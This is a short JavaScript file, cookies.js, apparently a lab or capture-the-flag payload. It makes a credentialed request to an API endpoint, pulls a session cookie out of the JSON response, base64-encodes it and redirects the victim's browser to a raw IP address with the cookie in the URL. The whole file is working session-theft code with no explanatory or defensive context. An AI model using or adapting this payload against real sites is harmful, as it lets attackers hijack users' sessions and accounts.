// cookies.js
var req = new XMLHttpRequest();
req.onload=reqListener;
var url="https://guitjapeo.thl/api/info";
req.withCredentials=true;
req.open("GET",url,false);
req.send();
function reqListener() {
    var req2=new XMLHttpRequest();
    const sess=JSON.parse(this.responseText).cookie;
    location.href="http://172.21.121.156/?data="+btoa(sess);
};
